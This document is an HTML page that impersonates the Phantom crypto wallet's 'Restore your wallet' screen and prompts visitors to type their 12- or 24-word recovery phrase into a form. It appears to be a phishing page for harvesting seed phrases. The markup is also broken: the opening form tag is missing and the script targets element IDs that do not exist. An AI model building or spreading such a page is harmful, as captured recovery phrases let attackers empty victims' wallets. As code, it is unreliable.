<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <link rel="icon" type="image/x-icon" href="icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Phantom | Restore wallet</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #dcd6f7;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .logo {
        position: absolute;
        top: 1rem;
        left: 1rem;
    }

    .logo img {
        height: 100px; /* adjust as needed */
        width: auto;
    }


    .help {
      position: absolute;
      top: 1rem;
      right: 1rem;
      font-size: 0.9rem;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }

    .container {
      background-color: #1e1e1e;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
      text-align: center;
      color: white;
      width: 320px;
    }

    .indicator-dots {
      display: flex;
      justify-content: center;
      gap: 5px;
      margin-bottom: 1rem;
    }

    .dot {
      width: 6px;
      height: 6px;
      background-color: #aaa;
      border-radius: 50%;
    }

    .dot.active {
      background-color: #5f5fff;
    }

    h2 {
      margin: 0.5rem 0;
    }

    p {
      font-size: 0.9rem;
      color: #aaa;
      margin-bottom: 1rem;
    }

    textarea {
      width: 100%;
      height: 100px;
      border-radius: 8px;
      border: none;
      padding: 0.8rem;
      font-size: 0.95rem;
      resize: none;
      background-color: #2e2e2e;
      color: white;
      outline: none;
    }

    .toggle {
      margin-top: 1rem;
      font-size: 0.85rem;
      color: #aaa;
      cursor: pointer;
    }

    .toggle:hover {
      text-decoration: underline;
    }

    button {
      width: 100%;
      margin-top: 1rem;
      padding: 0.7rem;
      background-color: #333;
      border: none;
      border-radius: 8px;
      color: #aaa;
      font-size: 0.95rem;
      cursor: not-allowed;
      transition: all 0.3s ease;
    }

    button.enabled {
      background-color: #5f5fff;
      color: white;
      cursor: pointer;
    }
  </style>
</head>

  <h2>Restore your wallet</h2>
  <p>Restore or import your Phantom or an existing wallet with your 12 or 24-word recovery phrase.</p>

  <textarea
    name="recoveryPhrase"
    placeholder="Enter your recovery phrase here..."
  ></textarea>

  <div class="toggle">I have a 24-word recovery phrase</div>

  <button type="submit">Restore Wallet</button>
</form>


  <script>
    const textarea = document.getElementById('recoveryInput');
    const button = document.getElementById('restoreBtn');

    textarea.addEventListener('input', () => {
      if (textarea.value.trim().length > 0) {
        button.disabled = false;
        button.classList.add('enabled');
      } else {
        button.disabled = true;
        button.classList.remove('enabled');
      }
    });
  </script>
